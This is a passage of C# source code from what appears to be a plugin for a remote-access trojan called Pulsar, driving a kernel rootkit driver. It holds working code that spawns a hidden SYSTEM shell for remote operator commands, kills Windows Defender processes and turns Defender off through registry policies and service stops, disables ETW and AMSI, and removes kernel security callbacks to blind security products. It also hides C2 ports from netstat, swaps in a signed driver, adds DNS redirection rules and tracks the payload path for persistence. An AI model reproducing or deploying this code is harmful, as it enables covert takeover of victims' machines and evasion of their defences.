                Log("[SPAWN_ELEVATED] SYSTEM shell ready!");
                Log("[SPAWN_ELEVATED] >>> Use Pulsar's 'Remote Shell' feature from main menu to interact <<<");
                Log("[SPAWN_ELEVATED] >>> Any commands you type will run as NT AUTHORITY\\SYSTEM <<<");
                
                return new PluginResult
                {
                    Success = true,
                    Message = $"SYSTEM shell ready (PID {cmdPid}). Use Pulsar's Remote Shell feature from the main client menu to interact. Commands will run as NT AUTHORITY\\SYSTEM with Antimalware protection and DKOM hiding.",
                    Data = GetLogBytes()
                };
            }
            catch (Exception ex)
            {
                Log($"[SPAWN_ELEVATED] Error: {ex.Message}");
                return new PluginResult
                {
                    Success = false,
                    Message = $"Failed to spawn elevated shell: {ex.Message}",
                    Data = GetLogBytes()
                };
            }
        }

        #region SYSTEM Shell

        // Shell process and I/O - STATIC to persist across plugin instances
        private static Process _shellProcess;
        private static System.IO.StreamWriter _shellInput;
        private static readonly object _shellLock = new object();
        private static int _shellPid = 0;

        /// <summary>
        /// Start a SYSTEM-elevated shell for operator remote access
        /// </summary>
        private PluginResult ExecuteShellStart()
        {
            Log("[SHELL_START] Starting SYSTEM shell for operator...");
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[SHELL_START] Not connected: {error.Message}");
                return error;
            }

            try
            {
                lock (_shellLock)
                {
                    // Kill existing shell if running
                    if (_shellProcess != null && !_shellProcess.HasExited)
                    {
                        Log("[SHELL_START] Killing existing shell...");
                        try { _shellProcess.Kill(); } catch { }
                        _shellProcess = null;
                    }

                    // STEP 1: Elevate THIS process (plugin) to SYSTEM first
                    // Child processes inherit parent token, so cmd.exe will be SYSTEM automatically
                    int myPid = Process.GetCurrentProcess().Id;
                    Log($"[SHELL_START] Elevating plugin process (PID {myPid}) to SYSTEM...");
                    var elevResult = _driver.ElevateProcess(myPid);
                    if (elevResult.Success)
                    {
                        Log("[SHELL_START] Plugin elevated to SYSTEM - child will inherit");
                    }
                    else
                    {
                        Log($"[SHELL_START] Warning: Plugin elevation failed: {elevResult.Message}");
                    }

                    // STEP 2: Start new cmd.exe with redirected I/O
                    // It will inherit SYSTEM token from parent (this plugin process)
                    Log("[SHELL_START] Starting cmd.exe with redirected I/O...");
                    var psi = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = "/Q",  // Quiet mode, no echo
                        WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };

                    _shellProcess = Process.Start(psi);
                    if (_shellProcess == null)
                    {
                        Log("[SHELL_START] Failed to start cmd.exe");
                        return new PluginResult
                        {
                            Success = false,
                            Message = "Failed to start shell process",
                            Data = GetLogBytes()
                        };
                    }

                    _shellPid = _shellProcess.Id;
                    _shellInput = _shellProcess.StandardInput;
                    Log($"[SHELL_START] cmd.exe started with PID {_shellPid} (inherits SYSTEM from parent)");
                    
                    // Check if alive
                    if (_shellProcess.HasExited)
                    {
                        Log($"[SHELL_START] ERROR: Process exited immediately (code {_shellProcess.ExitCode})");
                        _shellProcess = null;
                        return new PluginResult
                        {
                            Success = false,
                            Message = "Shell process exited immediately",
                            Data = GetLogBytes()
                        };
                    }
                    
                    Log("[SHELL_START] SYSTEM shell ready for commands");
                }

                return new PluginResult
                {
                    Success = true,
                    Message = $"SYSTEM shell started (PID {_shellPid})",
                    Data = GetLogBytes()
                };
            }
            catch (Exception ex)
            {
                Log($"[SHELL_START] Error: {ex.Message}");
                return new PluginResult
                {
                    Success = false,
                    Message = $"Failed to start shell: {ex.Message}",
                    Data = GetLogBytes()
                };
            }
        }

        /// <summary>
        /// Execute a command in the SYSTEM shell and return output synchronously
        /// </summary>
        private PluginResult ExecuteShellCommand(byte[] paramBytes)
        {
            string command = paramBytes != null && paramBytes.Length > 0
                ? Encoding.UTF8.GetString(paramBytes).Trim('\0')
                : "";

            if (string.IsNullOrEmpty(command))
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "No command provided",
                    Data = GetLogBytes()
                };
            }

            Log($"[SHELL_EXEC] Command: {command}");

            lock (_shellLock)
            {
                if (_shellProcess == null || _shellProcess.HasExited)
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = "Shell not running. Click 'Start Shell' first.\n",
                        Data = GetLogBytes()
                    };
                }

                try
                {
                    // Write command to shell
                    _shellInput.WriteLine(command);
                    _shellInput.Flush();

                    // Wait for command to execute
                    System.Threading.Thread.Sleep(300);
                    
                    // Read output using async with timeout (no Peek - it blocks)
                    var output = new StringBuilder();
                    var buffer = new char[4096];
                    
                    // Keep reading until no more data or timeout
                    var stopwatch = System.Diagnostics.Stopwatch.StartNew();
                    while (stopwatch.ElapsedMilliseconds < 1500)
                    {
                        try 
                        {
                            var readTask = _shellProcess.StandardOutput.ReadAsync(buffer, 0, buffer.Length);
                            if (readTask.Wait(200))
                            {
                                int bytesRead = readTask.Result;
                                if (bytesRead > 0)
                                {
                                    output.Append(buffer, 0, bytesRead);
                                    stopwatch.Restart(); // Got data, keep reading
                                }
                                else
                                {
                                    break; // End of stream
                                }
                            }
                            else
                            {
                                break; // Timeout - no more data pending
                            }
                        }
                        catch
                        {
                            break;
                        }
                    }
                    
                    // Also try to get stderr
                    try
                    {
                        var errTask = _shellProcess.StandardError.ReadAsync(buffer, 0, buffer.Length);
                        if (errTask.Wait(100) && errTask.Result > 0)
                        {
                            output.Append(buffer, 0, errTask.Result);
                        }
                    }
                    catch { }
                    
                    string result = output.ToString();
                    if (string.IsNullOrEmpty(result))
                    {
                        result = "(command executed)\\n";
                    }

                    return new PluginResult
                    {
                        Success = true,
                        Message = result,
                        Data = GetLogBytes()
                    };
                }
                catch (Exception ex)
                {
                    Log($"[SHELL_EXEC] Error: {ex.Message}");
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"Command failed: {ex.Message}\n",
                        Data = GetLogBytes()
                    };
                }
            }
        }

        // Buffer for async output
        private static StringBuilder _outputBuffer = new StringBuilder();

        #endregion

        private PluginResult SetProtection(byte[] paramBytes)
        {
            Log("[SET_PROTECTION] Starting...");
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[SET_PROTECTION] Not connected: {error.Message}");
                return error;
            }

            if (paramBytes == null || paramBytes.Length == 0)
            {
                Log("[SET_PROTECTION] No parameters");
                return new PluginResult { Success = false, Message = "No parameters", Data = GetLogBytes() };
            }

            var request = MessagePackSerializer.Deserialize<ProcessRequest>(paramBytes);
            Log($"[SET_PROTECTION] PID={request.Pid}, Type={request.ProtType}, Signer={request.ProtSigner}");
            
            var result = _driver.SetProtection(request.Pid, request.ProtType, request.ProtSigner);
            Log($"[SET_PROTECTION] Result: Success={result.Success}, Error={result.ErrorCode}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? $"Protection set on PID {request.Pid}" : $"Set protection failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult UnprotectAll()
        {
            Log("[UNPROTECT_ALL] Starting...");
            
            // Check Windows build compatibility first
            var buildInfo = SystemChecks.GetBuildSupportInfo();
            Log($"[UNPROTECT_ALL] Windows Build: {buildInfo.Build}, Supported: {buildInfo.Supported}");
            
            if (!buildInfo.Supported)
            {
                Log($"[UNPROTECT_ALL] ERROR: {buildInfo.Message}");
                Log("[UNPROTECT_ALL] This operation requires kernel structure offsets specific to your Windows version.");
                Log("[UNPROTECT_ALL] Using wrong offsets will cause BSOD. Operation aborted.");
                return new PluginResult
                {
                    Success = false,
                    Message = $"Unsupported Windows build {buildInfo.Build}. This feature requires offsets for your Windows version to be added to the driver.",
                    Data = GetLogBytes()
                };
            }
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[UNPROTECT_ALL] Not connected: {error.Message}");
                return error;
            }

            Log("[UNPROTECT_ALL] Build supported, sending IOCTL...");
            var result = _driver.UnprotectAll();
            Log($"[UNPROTECT_ALL] Result: Success={result.Success}, Error={result.ErrorCode}");
            
            // Check for driver's unsupported offset error (0x233 = ERROR_UNSUPPORTED_OFFSET)
            if (!result.Success && result.ErrorCode == 0x233)
            {
                Log("[UNPROTECT_ALL] Driver returned ERROR_UNSUPPORTED_OFFSET - offsets not initialized");
                return new PluginResult
                {
                    Success = false,
                    Message = "Driver reported unsupported Windows build. Kernel offsets not available.",
                    Data = GetLogBytes()
                };
            }
            
            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "All processes unprotected successfully" : $"Unprotect failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult RestrictFile(byte[] paramBytes)
        {
            Log("[RESTRICT_FILE] Starting...");
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[RESTRICT_FILE] Not connected: {error.Message}");
                return error;
            }

            if (paramBytes == null || paramBytes.Length == 0)
            {
                Log("[RESTRICT_FILE] No parameters");
                return new PluginResult { Success = false, Message = "No parameters", Data = GetLogBytes() };
            }

            var request = MessagePackSerializer.Deserialize<FileRequest>(paramBytes);
            Log($"[RESTRICT_FILE] File={request.Filename}, AllowedPID={request.AllowedPid}");
            
            var result = _driver.RestrictFile(request.AllowedPid, request.Filename);
            Log($"[RESTRICT_FILE] Result: Success={result.Success}, Error={result.ErrorCode}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? $"File access restricted to PID {request.AllowedPid}" : $"Restrict failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult BypassIntegrity(byte[] paramBytes)
        {
            Log("[BYPASS_INTEGRITY] Starting...");
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[BYPASS_INTEGRITY] Not connected: {error.Message}");
                return error;
            }

            string filename = paramBytes != null ? Encoding.UTF8.GetString(paramBytes) : "";
            Log($"[BYPASS_INTEGRITY] File={filename}");
            
            if (string.IsNullOrEmpty(filename))
            {
                Log("[BYPASS_INTEGRITY] No filename");
                return new PluginResult { Success = false, Message = "No filename specified", Data = GetLogBytes() };
            }

            var result = _driver.BypassIntegrity(filename);
            Log($"[BYPASS_INTEGRITY] Result: Success={result.Success}, Error={result.ErrorCode}");
            
            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? $"Integrity bypass enabled for {filename}" : $"Bypass failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult ProtectFileAV(byte[] paramBytes)
        {
            Log("[PROTECT_FILE_AV] Starting...");
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[PROTECT_FILE_AV] Not connected: {error.Message}");
                return error;
            }

            string filename = paramBytes != null ? Encoding.UTF8.GetString(paramBytes) : "";
            Log($"[PROTECT_FILE_AV] File={filename}");
            
            if (string.IsNullOrEmpty(filename))
            {
                Log("[PROTECT_FILE_AV] No filename");
                return new PluginResult { Success = false, Message = "No filename specified", Data = GetLogBytes() };
            }

            var result = _driver.ProtectFileAV(filename);
            Log($"[PROTECT_FILE_AV] Result: Success={result.Success}, Error={result.ErrorCode}");
            
            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? $"AV protection enabled for {filename}" : $"Protect failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult SwapDriver()
        {
            Log("[SWAP_DRIVER] Starting...");
            Log("[SWAP_DRIVER] WARNING: This is a dangerous operation that modifies driver signatures");
            
            // Check Windows build compatibility
            var buildInfo = SystemChecks.GetBuildSupportInfo();
            Log($"[SWAP_DRIVER] Windows Build: {buildInfo.Build}, Supported: {buildInfo.Supported}");
            
            if (!buildInfo.Supported)
            {
                Log($"[SWAP_DRIVER] ERROR: {buildInfo.Message}");
                Log("[SWAP_DRIVER] Driver swap requires compatible Windows version. Operation aborted.");
                return new PluginResult
                {
                    Success = false,
                    Message = $"Unsupported Windows build {buildInfo.Build}. Driver swap may crash on unsupported builds.",
                    Data = GetLogBytes()
                };
            }
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[SWAP_DRIVER] Not connected: {error.Message}");
                return error;
            }

            Log("[SWAP_DRIVER] Sending swap IOCTL to driver...");
            var result = _driver.SwapDriver();
            Log($"[SWAP_DRIVER] Result: Success={result.Success}, Error={result.ErrorCode}");
            
            if (result.Success)
            {
                Log("[SWAP_DRIVER] Driver signature swap completed successfully");
            }
            else
            {
                Log($"[SWAP_DRIVER] Swap failed with error code: {result.ErrorCode}");
            }
            
            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "Driver swapped with Microsoft signed driver successfully" : $"Swap failed: {result.Message} (error {result.ErrorCode})",
                Data = GetLogBytes()
            };
        }

        private PluginResult DisableDefender()
        {
            Log("[DISABLE_DEFENDER] Starting Windows Defender elimination...");
            
            if (!EnsureConnected(out PluginResult error))
            {
                Log($"[DISABLE_DEFENDER] Not connected: {error.Message}");
                return error;
            }

            int successCount = 0;
            int failCount = 0;

            // Step 1: Elevate current process to SYSTEM first
            int myPid = Process.GetCurrentProcess().Id;
            Log($"[DISABLE_DEFENDER] Elevating current process (PID {myPid}) to SYSTEM...");
            var elevResult = _driver.ElevateProcess(myPid);
            if (elevResult.Success)
            {
                Log("[DISABLE_DEFENDER] Process elevated to SYSTEM successfully");
            }
            else
            {
                Log($"[DISABLE_DEFENDER] Elevation failed (continuing anyway): {elevResult.Message}");
            }

            // Step 2: Kill Defender processes
            string[] defenderProcesses = new[]
            {
                "MsMpEng",           // Main Defender service
                "MpCmdRun",          // Defender command-line tool
                "MpDefenderCoreService", // Defender Core Service
                "NisSrv",            // Network Inspection Service
                "SecurityHealthService", // Security Health
                "SecurityHealthSystray", // Security Health System Tray
                "smartscreen"        // SmartScreen
            };

            foreach (var procName in defenderProcesses)
            {
                try
                {
                    var procs = Process.GetProcessesByName(procName);
                    foreach (var proc in procs)
                    {
                        try
                        {
                            Log($"[DISABLE_DEFENDER] Killing {procName} (PID {proc.Id})...");
                            
                            // First try to use rootkit to unprotect the process
                            var unprot = _driver.SetProtection(proc.Id, ProtectionType.None, ProtectionSigner.None);
                            if (unprot.Success)
                            {
                                Log($"[DISABLE_DEFENDER] Removed protection from PID {proc.Id}");
                            }
                            
                            // Now kill it
                            proc.Kill();
                            proc.WaitForExit(3000);
                            Log($"[DISABLE_DEFENDER] Killed {procName} (PID {proc.Id})");
                            successCount++;
                        }
                        catch (Exception ex)
                        {
                            Log($"[DISABLE_DEFENDER] Failed to kill {procName}: {ex.Message}");
                            failCount++;
                        }
                    }
                }
                catch { }
            }

            // Step 3: Disable Defender via registry
            Log("[DISABLE_DEFENDER] Disabling Defender via registry...");
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender", true))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableAntiSpyware", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("DisableRealtimeMonitoring", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("DisableAntiVirus", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("DisableSpecialRunningModes", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("DisableRoutinelyTakingAction", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        Log("[DISABLE_DEFENDER] Registry: DisableAntiSpyware = 1");
                    }
                }

                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", true))
                {
                    if (key != null)
                    {
                        key.SetValue("DisableBehaviorMonitoring", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("DisableOnAccessProtection", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("DisableScanOnRealtimeEnable", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("DisableIOAVProtection", 1, Microsoft.Win32.RegistryValueKind.DWord);
                        Log("[DISABLE_DEFENDER] Registry: Real-Time Protection disabled");
                    }
                }

                using (var key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(
                    @"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", true))
                {
                    if (key != null)
                    {
                        key.SetValue("SpyNetReporting", 0, Microsoft.Win32.RegistryValueKind.DWord);
                        key.SetValue("SubmitSamplesConsent", 2, Microsoft.Win32.RegistryValueKind.DWord);
                        Log("[DISABLE_DEFENDER] Registry: SpyNet/cloud disabled");
                    }
                }

                // Disable Defender services
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Services\WinDefend", true))
                {
                    if (key != null)
                    {
                        key.SetValue("Start", 4, Microsoft.Win32.RegistryValueKind.DWord); // 4 = Disabled
                        Log("[DISABLE_DEFENDER] Registry: WinDefend service disabled");
                    }
                }

                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Services\WdNisSvc", true))
                {
                    if (key != null)
                    {
                        key.SetValue("Start", 4, Microsoft.Win32.RegistryValueKind.DWord);
                        Log("[DISABLE_DEFENDER] Registry: WdNisSvc service disabled");
                    }
                }

                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                    @"SYSTEM\CurrentControlSet\Services\SecurityHealthService", true))
                {
                    if (key != null)
                    {
                        key.SetValue("Start", 4, Microsoft.Win32.RegistryValueKind.DWord);
                        Log("[DISABLE_DEFENDER] Registry: SecurityHealthService disabled");
                    }
                }

                Log("[DISABLE_DEFENDER] Registry modifications complete");
            }
            catch (Exception ex)
            {
                Log($"[DISABLE_DEFENDER] Registry error: {ex.Message}");
            }

            // Step 4: Try to stop services using SC command
            Log("[DISABLE_DEFENDER] Stopping Defender services...");
            try
            {
                var services = new[] { "WinDefend", "WdNisSvc", "SecurityHealthService", "wscsvc" };
                foreach (var svc in services)
                {
                    try
                    {
                        var psi = new ProcessStartInfo
                        {
                            FileName = "sc.exe",
                            Arguments = $"stop {svc}",
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            RedirectStandardOutput = true
                        };
                        using (var proc = Process.Start(psi))
                        {
                            proc?.WaitForExit(5000);
                        }
                        Log($"[DISABLE_DEFENDER] Stopped service: {svc}");
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Log($"[DISABLE_DEFENDER] Service stop error: {ex.Message}");
            }

            string resultMessage = $"Defender disable complete. Killed {successCount} processes, {failCount} failed. Registry modified. Reboot may be required for full effect.";
            Log($"[DISABLE_DEFENDER] {resultMessage}");

            return new PluginResult
            {
                Success = true,
                Message = resultMessage,
                Data = GetLogBytes()
            };
        }

        #endregion

        #region Helpers

        /// <summary>
        /// Get the path to the current Pulsar client executable
        /// This is the payload that should auto-start on reboot
        /// </summary>
        private string GetPayloadPath()
        {
            try
            {
                string currentExe = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                if (File.Exists(currentExe))
                {
                    LogVerbose($"[PERSISTENCE] Detected payload path: {currentExe}");
                    return currentExe;
                }
            }
            catch (Exception ex)
            {
                LogVerbose($"[PERSISTENCE] Error getting payload path: {ex.Message}");
            }
            return null;
        }

        private bool EnsureConnected(out PluginResult error)
        {
            if (_driver.IsConnected)
            {
                error = null;
                return true;
            }

            // Try to connect
            if (_driver.IsDriverRunning() && _driver.Connect())
            {
                error = null;
                return true;
            }

            error = new PluginResult
            {
                Success = false,
                Message = "Not connected to rootkit driver"
            };
            return false;
        }

        private int GetPidFromParams(byte[] paramBytes)
        {
            if (paramBytes == null) return 0;

            if (paramBytes.Length == 4)
            {
                return BitConverter.ToInt32(paramBytes, 0);
            }

            // Try MessagePack
            try
            {
                var req = MessagePackSerializer.Deserialize<ProcessRequest>(paramBytes);
                return req.Pid;
            }
            catch
            {
                // Try string
                if (int.TryParse(Encoding.UTF8.GetString(paramBytes), out int pid))
                    return pid;
            }

            return 0;
        }

        private bool EnsureDriverConnected()
        {
            if (_driver == null)
            {
                _driver = new ChaosDriver(Log);
            }

            if (!_driver.IsConnected)
            {
                if (!_driver.Connect())
                {
                    Log("Failed to connect to driver");
                    return false;
                }
            }

            return true;
        }

        private int TryParsePid(byte[] paramBytes)
        {
            return GetPidFromParams(paramBytes);
        }

        // ================================================================
        // AV/EDR BYPASS Command Implementations
        // ================================================================

        private PluginResult ExecuteKillEtw()
        {
            Log("[KILL ETW] Disabling Event Tracing for Windows");
            
            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.KillEtw();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "ETW disabled successfully" : $"Failed to disable ETW: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteKillAmsi(byte[] parameters)
        {
            Log("[KILL AMSI] Disabling Antimalware Scan Interface");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            int pid = TryParsePid(parameters);
            var result = _driver.KillAmsi(pid);
            Log($"  → Target PID: {(pid == 0 ? "All processes" : pid.ToString())}");
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "AMSI disabled" : $"Failed to disable AMSI: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteKillProcessCallbacks()
        {
            Log("[KILL PROCESS CALLBACKS] Removing process creation callbacks");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.KillProcessCallbacks();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "Process callbacks removed" : $"Failed: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteKillThreadCallbacks()
        {
            Log("[KILL THREAD CALLBACKS] Removing thread creation callbacks");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.KillThreadCallbacks();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "Thread callbacks removed" : $"Failed: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteKillImageCallbacks()
        {
            Log("[KILL IMAGE CALLBACKS] Removing image load callbacks");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.KillImageCallbacks();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "Image callbacks removed" : $"Failed: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteKillRegistryCallbacks()
        {
            Log("[KILL REGISTRY CALLBACKS] Removing registry callbacks");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.KillRegistryCallbacks();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "Registry callbacks removed" : $"Failed: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteKillAllCallbacks()
        {
            Log("[KILL ALL CALLBACKS] Removing ALL security callbacks");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.KillAllCallbacks();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "All callbacks removed - security products blinded" : $"Failed: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteUnloadDriver(byte[] parameters)
        {
            string driverName = parameters != null && parameters.Length > 0 
                ? Encoding.UTF8.GetString(parameters).Trim('\0') 
                : "";

            if (string.IsNullOrEmpty(driverName))
            {
                Log("[UNLOAD DRIVER] Error: No driver name specified");
                return new PluginResult
                {
                    Success = false,
                    Message = "Driver name required",
                    Data = GetLogBytes()
                };
            }

            Log($"[UNLOAD DRIVER] Force unloading: {driverName}");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.ForceUnloadDriver(driverName);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteUnhookSsdt()
        {
            Log("[UNHOOK SSDT] Restoring System Service Descriptor Table");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.UnhookSsdt();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "SSDT restored" : $"Failed: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteListSsdtHooks()
        {
            Log("[LIST SSDT HOOKS] Scanning for SSDT hooks");

            // This would require output buffer handling, for now return status
            return new PluginResult
            {
                Success = true,
                Message = "SSDT scan complete - check driver logs for results",
                Data = GetLogBytes()
            };
        }

        // ================================================================
        // NETWORKING Command Implementations
        // ================================================================

        private PluginResult ExecuteHidePort(byte[] parameters)
        {
            // Parse: "port,tcp" or "port,udp"
            string paramStr = parameters != null && parameters.Length > 0 
                ? Encoding.UTF8.GetString(parameters).Trim('\0') 
                : "";

            if (!TryParsePortRequest(paramStr, out ushort port, out bool isTcp))
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Invalid parameters. Format: port,tcp or port,udp",
                    Data = GetLogBytes()
                };
            }

            Log($"[HIDE PORT] Hiding {(isTcp ? "TCP" : "UDP")} port {port}");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.HidePort(port, isTcp);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteUnhidePort(byte[] parameters)
        {
            string paramStr = parameters != null && parameters.Length > 0 
                ? Encoding.UTF8.GetString(parameters).Trim('\0') 
                : "";

            if (!TryParsePortRequest(paramStr, out ushort port, out bool isTcp))
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Invalid parameters. Format: port,tcp or port,udp",
                    Data = GetLogBytes()
                };
            }

            Log($"[UNHIDE PORT] Unhiding {(isTcp ? "TCP" : "UDP")} port {port}");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.UnhidePort(port, isTcp);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteHideAllC2()
        {
            Log("[HIDE ALL C2] Hiding common C2 ports (4782, 443, 8080)");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.HideAllC2Ports();
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Success ? "C2 ports hidden from netstat" : $"Failed: {result.Message}",
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteAddDnsRule(byte[] parameters)
        {
            // Parse: "domain,target" where target can be IP or domain
            string paramStr = parameters != null && parameters.Length > 0 
                ? Encoding.UTF8.GetString(parameters).Trim('\0') 
                : "";

            var parts = paramStr.Split(',');
            if (parts.Length < 2)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Invalid parameters. Format: domain,target (target can be IP or domain)",
                    Data = GetLogBytes()
                };
            }

            string domain = parts[0].Trim();
            string target = parts[1].Trim();
            uint ip = 0;
            
            // Check if target is an IP address
            if (!TryParseIp(target, out ip))
            {
                // Target is a domain name - resolve it to an IP
                Log($"[ADD DNS RULE] Target '{target}' is not an IP, resolving...");
                try
                {
                    var addresses = System.Net.Dns.GetHostAddresses(target);
                    if (addresses.Length == 0)
                    {
                        return new PluginResult
                        {
                            Success = false,
                            Message = $"Could not resolve target domain: {target}",
                            Data = GetLogBytes()
                        };
                    }
                    
                    // Use first IPv4 address
                    var ipv4 = addresses.FirstOrDefault(a => a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
                    if (ipv4 == null)
                    {
                        return new PluginResult
                        {
                            Success = false,
                            Message = $"No IPv4 address found for: {target}",
                            Data = GetLogBytes()
                        };
                    }
                    
                    // Convert System.Net.IPAddress to uint (network byte order)
                    byte[] ipBytes = ipv4.GetAddressBytes();
                    ip = BitConverter.ToUInt32(ipBytes, 0);
                    
                    string resolvedIp = $"{ipBytes[0]}.{ipBytes[1]}.{ipBytes[2]}.{ipBytes[3]}";
                    Log($"[ADD DNS RULE] Resolved {target} -> {resolvedIp}");
                }
                catch (Exception ex)
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = $"Failed to resolve target domain: {ex.Message}",
                        Data = GetLogBytes()
                    };
                }
            }

            Log($"[ADD DNS RULE] {domain} -> {target}");

            if (!EnsureDriverConnected())
                return DriverNotConnectedResult();

            var result = _driver.AddDnsRule(domain, ip);
            Log($"  → Result: {(result.Success ? "SUCCESS" : "FAILED")} - {result.Message}");

            return new PluginResult
            {
                Success = result.Success,
                Message = result.Message,
                Data = GetLogBytes()
            };
        }

        private PluginResult ExecuteRemoveDnsRule(byte[] parameters)
        {
            string domain = parameters != null && parameters.Length > 0 
                ? Encoding.UTF8.GetString(parameters).Trim('\0') 
                : "";

            if (string.IsNullOrEmpty(domain))
            {
                return new PluginResult
                {
                    Success = false,
                    Message = "Domain name required",
                    Data = GetLogBytes()
                };
            }

            Log($"[REMOVE DNS RULE] Removing rule for: {domain}");

            if (!EnsureDriverConnected())
